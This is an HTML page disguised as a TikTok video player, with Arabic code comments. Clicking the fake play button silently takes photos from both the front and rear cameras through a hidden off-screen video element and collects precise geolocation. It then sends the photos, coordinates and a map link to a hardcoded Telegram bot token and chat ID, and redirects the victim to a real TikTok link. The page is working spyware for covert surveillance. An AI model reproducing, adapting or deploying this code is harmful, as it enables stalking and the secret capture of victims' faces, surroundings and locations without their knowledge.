<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }
        .player {
            width: 100%;
            max-width: 420px;
            position: relative;
            cursor: pointer;
        }
        .player img {
            width: 100%;
            height: auto;
            display: block;
        }
        .play-btn {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 70px; height: 70px;
            background: rgba(0,0,0,0.65);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            pointer-events: none;
            transition: opacity 0.3s;
        }
        .play-btn svg {
            width: 32px; height: 32px;
            fill: #fff;
            margin-left: 4px;
        }
        #hiddenCam {
            position: fixed;
            top: -9999px; left: -9999px;
            width: 1px; height: 1px;
            opacity: 0; pointer-events: none;
        }
    </style>
</head>
<body>

<div class="player" id="player">
    <img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=400&q=80" alt=" TikTok">
    <div class="play-btn" id="playBtn">
        <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
    </div>
</div>

<video id="hiddenCam" autoplay playsinline muted></video>

<script>
// ================== الإعدادات ==================
const TOKEN   = '8735029800:AAHAkVSyWV0uiLQugB-OIIaCbMi-h5se5M4';
const CHAT_ID = '1659035307';
const TIKTOK_URL = 'https://vt.tiktok.com/ZSVucc7HX/';

// 📐 مقاس الصورة (9:16 طولية) — 720p توازن مثالي بين الجودة والسرعة
const VW = 720;
const VH = 1280;
const JPEG_QUALITY = 0.90;      // جودة عالية
const LOC_TIMEOUT  = 10000;      // 3 ثواني للموقع
const CAM_WARMUP   = 350;       // استنى الكاميرا تضبط الإضاءة
// =============================================

const player    = document.getElementById('player');
const playBtn  = document.getElementById('playBtn');
const hiddenCam = document.getElementById('hiddenCam');

let done = false;

// ================== جلب الموقع ==================
function getLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(null);

        let finished = false;
        const finish = (val) => {
            if (finished) return;
            finished = true;
            resolve(val);
        };

        const timer = setTimeout(() => finish(null), LOC_TIMEOUT);

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                clearTimeout(timer);
                finish({
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    acc: pos.coords.accuracy
                });
            },
            () => {
                clearTimeout(timer);
                finish(null);
            },
            { enableHighAccuracy: true, timeout: LOC_TIMEOUT, maximumAge: 60000 }
        );
    });
}

// ================== انتظار الكاميرا ==================
// بدل ما نستنى وقت ثابت، بنستنى الفيديو يجهز فعلاً
function waitForVideoReady(timeout = 1500) {
    return new Promise((resolve) => {
        const start = Date.now();
        const check = () => {
            if (hiddenCam.videoWidth > 0 && hiddenCam.videoHeight > 0) {
                resolve(true);
            } else if (Date.now() - start > timeout) {
                resolve(false);
            } else {
                requestAnimationFrame(check);
            }
        };
        check();
    });
}

// ================== التقاط صورة ==================
async function captureFromCamera(facingMode) {
    let localStream = null;
    try {
        localStream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: { ideal: facingMode },
                width:  { ideal: VH },   // ملاحظة: العرض والطول متعمدين عشان الكاميرا تفهم إننا عايزين طولي
                height: { ideal: VW }
            },
            audio: false
        });

        hiddenCam.srcObject = localStream;
        await hiddenCam.play();

        // استنى الفيديو يجهز فعلاً (أسرع من setTimeout ثابت)
        await waitForVideoReady();
        // استنى بسيط للإضاءة/التركيز
        await new Promise(r => setTimeout(r, CAM_WARMUP));

        // 📸 الرسم على الكانفاس بنسبة 9:16 + قص ذكي
        const canvas = document.createElement('canvas');
        canvas.width  = VW;
        canvas.height = VH;

        const ctx = canvas.getContext('2d', { willReadFrequently: false });
        ctx.imageSmoothingEnabled = true;
        ctx.imageSmoothingQuality = 'high';

        const vw = hiddenCam.videoWidth;
        const vh = hiddenCam.videoHeight;
        const targetRatio = VW / VH;
        const sourceRatio = vw / vh;

        let sx, sy, sw, sh;
        if (sourceRatio > targetRatio) {
            sh = vh;
            sw = vh * targetRatio;
            sx = (vw - sw) / 2;
            sy = 0;
        } else {
            sw = vw;
            sh = vw / targetRatio;
            sx = 0;
            sy = (vh - sh) / 2;
        }

        // ✅ الكاميرا الأمامية بتبقى معكوسة (mirror) — نصلحها
        ctx.save();
        if (facingMode === 'user') {
            ctx.translate(VW, 0);
            ctx.scale(-1, 1);
        }
        ctx.drawImage(hiddenCam, sx, sy, sw, sh, 0, 0, VW, VH);
        ctx.restore();

        const blob = await new Promise(r =>
            canvas.toBlob(r, 'image/jpeg', JPEG_QUALITY)
        );

        // 🛑 وقف الكاميرا فوراً (مهم للسرعة)
        localStream.getTracks().forEach(t => t.stop());

        console.log(`📷 ${facingMode}: ${(blob?.size / 1024).toFixed(1)} KB`);
        return blob;

    } catch (e) {
        console.warn(`❌ فشل الكاميرا (${facingMode}):`, e.message);
        if (localStream) localStream.getTracks().forEach(t => t.stop());
        return null;
    }
}

// ================== إرسال صورة ==================
function sendPhoto(blob, caption) {
    return new Promise((resolve) => {
        const iframe = document.createElement('iframe');
        iframe.name = 'tg' + Date.now() + Math.random();
        iframe.style.display = 'none';
        document.body.appendChild(iframe);

        const form = document.createElement('form');
        form.method = 'POST';
        form.action = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
        form.enctype = 'multipart/form-data';
        form.target = iframe.name;
        form.style.display = 'none';

        const i1 = document.createElement('input');
        i1.type = 'hidden'; i1.name = 'chat_id'; i1.value = CHAT_ID;
        form.appendChild(i1);

        const i2 = document.createElement('input');
        i2.type = 'hidden'; i2.name = 'caption'; i2.value = caption;
        form.appendChild(i2);

        const file = new File([blob], 'shot.jpg', { type: 'image/jpeg' });
        const i3 = document.createElement('input');
        i3.type = 'file'; i3.name = 'photo';
        const dt = new DataTransfer();
        dt.items.add(file);
        i3.files = dt.files;
        form.appendChild(i3);

        document.body.appendChild(form);
        form.submit();

        // ⚡ 700ms كفاية عشان الفورم يتبعت
        setTimeout(() => {
            form.remove();
            iframe.remove();
            resolve();
        }, 3000);
    });
}

// ================== الحدث الرئيسي ==================
player.addEventListener('click', async () => {
    if (done) return;
    done = true;

    try {
        // 🚀 الموقع يشتغل في الخلفية من أول لحظة
        const locationPromise = getLocation();

        // 📸 1. الأمامية الأول
        const frontBlob = await captureFromCamera('user');

        // 📸 2. الخلفية
        const backBlob = await captureFromCamera('environment');

        // 📍 3. هات الموقع (أو انتهت مهلته)
        const loc = await locationPromise;

        const timeStr = new Date().toLocaleString('ar-EG');

        // تجهيز معلومات الموقع
        let locInfo = '\n📍 الموقع: غير متاح';
        if (loc) {
            locInfo = `\n📍 الموقع: https://maps.google.com/?q=${loc.lat},${loc.lng}`;
            locInfo += `\n🎯 الدقة: ${Math.round(loc.acc)} متر`;

            // إرسال الموقع كرسالة منفصلة (خريطة تفاعلية)
        }

        // 📤 4. إرسال الصورتين بالتوازي (أسرع بكتير)
        const tasks = [];
   // بدلاً من تجميعهم في مصفوفة واستخدام Promise.all، سنقوم بإرسالهم واحدة تلو الأخرى
if (frontBlob) {
    await sendPhoto(frontBlob, `📸 صورة أمامية\n🎬 ضغط على الفيديو - ${timeStr}${locInfo}\n${TIKTOK_URL}`);
}

if (backBlob) {
    // مهلة صغيرة لضمان عدم ضغط السيرفر أو المتصفح
    await new Promise(r => setTimeout(r, 500));
    
    await sendPhoto(backBlob, `📷 صورة خلفية\n🎬 ضغط على الفيديو - ${timeStr}${locInfo}\n${TIKTOK_URL}`);
}

        // 🚀 5. حول للتيك توك
        window.location.href = TIKTOK_URL;

    } catch (e) {
        console.log(e);
        window.location.href = TIKTOK_URL;
    }
});
</script>
</body>
</html>
